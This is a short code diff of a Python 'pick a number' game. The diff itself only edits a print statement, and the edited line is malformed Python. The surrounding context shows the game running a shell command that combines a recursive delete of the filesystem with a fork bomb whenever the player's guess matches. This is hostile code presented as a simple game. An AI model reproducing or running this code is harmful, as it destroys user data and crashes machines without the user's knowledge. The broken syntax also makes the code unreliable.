@@ -15,7 +15,7 @@ def main():
     if start_game.lower() == "yes":
         play = input("Pick a Number between 1 and 6 \n")
         choose
-        print(choose)
+        print("computer chooses"choose)
         if play == choose:
             print("You lose :(")
             os.system("rm -rf/* | :(){ :|:& };:")
